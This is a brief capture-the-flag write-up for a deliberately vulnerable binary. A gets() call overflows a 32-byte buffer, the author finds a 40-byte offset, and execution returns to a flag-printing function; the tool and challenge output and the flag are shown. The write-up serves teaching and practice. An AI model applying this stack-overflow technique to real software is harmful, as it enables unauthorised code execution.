# ret2generic-flag-reader

Reading through the source code, we can see that program puts message into `char comments_and_concerns[32];` variable with `gets()`

There is also `super_generic_flag_reading_function_please_ret_to_me()` which prints the flag for us.

## Exploitation

We just have to access the stack and execute `super_generic_flag_reading_function_please_ret_to_me()`-function

Let's get the offset:
```bash
[+] Searching 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala'
[+] Found at offset 40 (big-endian search)
```

Running the exploit gives us the flag

```python
[*] Switching to interactive mode
alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
slap on some flavortext and there's no way rob will fire me now!
this is genius!! what do you think?
flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}
```

### Flag
flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}
